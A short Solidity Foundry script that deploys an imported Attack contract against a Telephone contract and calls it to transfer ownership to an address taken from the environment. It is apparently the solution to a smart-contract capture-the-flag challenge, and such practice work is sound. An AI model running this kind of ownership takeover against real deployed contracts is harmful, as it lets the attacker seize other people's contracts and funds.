// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";
import {Attack} from "../src/Attack.sol";

contract AttackScript is Script {
    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.rememberKey(deployerPrivateKey);

        vm.startBroadcast(deployer);

        Attack attack = new Attack(Telephone(vm.envAddress("TELEPHONE")));
        address owner = vm.envAddress("OWNER");
        attack.attack(owner);

        vm.stopBroadcast();
    }
}
